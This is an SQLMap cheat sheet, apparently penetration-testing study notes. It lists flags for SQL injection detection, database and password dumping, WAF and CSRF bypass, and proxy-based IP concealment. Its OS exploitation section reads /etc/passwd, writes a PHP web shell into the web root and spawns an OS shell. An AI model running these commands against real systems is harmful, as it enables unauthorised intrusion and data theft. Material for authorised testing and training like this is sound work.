# SQLMap

SQLMap is the only penetration testing tool that can properly detect and exploit all known SQLi types.

The technique characters `BEUSTQ` refers to the following:

```sh
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries
```

**Getting Started**

```sh
sqlmap -u 'http://target.com?id=1' -p id 

sqlmap -h
# Basic Listing

sqlmap -hh
# Advanced Listing

--data 'uid=1*&name=test' 						
# POST request specifying an injection point with an asterisk

-t /tmp/traffic.txt 							
# Store traffic to an output file

--dbms=MySQL			 						
# specifier le type de base de donnee

-v3 --fresh-queries		 						
# pour connaitre le payload utiliser par sqlmap

--users					 						
# Voir les utilisateurs de la base de donnee

--method [GET, POST, PUT, etc...]
--batch 				 						
# Run SQLMap without asking for user input
```

## Attack Tuning

In most cases, SQLMap should run out of the box with the provided target details.

```sh
--prefix="%'))" --suffix="-- -"
# Specifying a prefix or suffix

--level=5 --risk=3 		
```

## Database Enumeration

```sh
--banner --current-user --current-db --is-dba

# Database version banner (switch --banner)
# Current user name (switch --current-user)
# Current database name (switch --current-db)
# Checking if the current user has DBA (administrator) rights.

--dump-all --exclude-sysdbs
# skip the retrieval of content from system databases

--schema 										
# Retrieve the structure of all of the tables so that we can have a complete overview of the database architecture

--search [-T user, -C pass] 								
# Searching for data (looking for all of the table names or column names containing the keyword user|pass)

--passwords --batch 							
# Password enumeration and cracking
```

> `--all --batch` will automatically do the whole enumeration process on the target itself, and provide the entire enumeration details.

## Bypassing Web Application Protections

```sh
--csrf-token="csrf-token" 						
# Anti-CSRF Token Bypass

--randomize=rp --batch -v 5 | grep URI
# Unique Value Bypass

--eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
# Calculated Parameter Bypass

--proxy="socks4://177.39.187.70:33283"
--proxy-file proxy_file.txt
# IP Address Concealing
```

If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch `--check-tor`. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).

```sh
--skip-waf
# WAF Bypass

--random-agent --mobile
# User-agent Blacklisting Bypass

--list-tampers
--tamper=between,randomcase
# Tamper Scripts

--chunked
# Miscellaneous Bypasses
```

## OS Exploitation

The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server.

```sh
--is-dba
# Checking for DBA Privileges

--file-read "/etc/passwd" 						
# Reading a local file

--file-write "shell.php" --file-dest "/var/www/html/shell.php" 	
# Writing a file

--os-shell 										
# Spawning an OS shell
```